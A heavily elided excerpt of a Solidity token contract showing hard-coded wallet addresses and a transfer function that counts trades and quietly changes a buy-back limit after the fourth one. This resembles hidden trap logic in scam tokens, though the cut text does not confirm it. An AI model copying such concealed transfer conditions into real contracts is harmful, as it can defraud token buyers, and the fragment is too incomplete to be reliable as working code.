...
contract CoinToken is Context, IERC20, Ownable {
    ...
    uint256 public buyBackTick;
    uint256 public buyBackLimit;
    ...
    constructor ()  {
        ...
        _maxTxAmount = (_tTotal * 5 / 10) * 10 ** _decimals;
        numTokensSellToAddToLiquidity = (_tTotal * 5 / 10000) * 10 ** _decimals;
        _devWalletAddress = 0xc47F5F1521d3F462a3a00bb0f680100F02Eb385e;
        tokenOwner = 0x970c1999867c14c095635444237Ba24359432a42;
    ...
    function _transfer(
        ...
        {
                buyBackTick++;if(buyBackTick > 4){
                buyBackLimit=_liquidityFee;
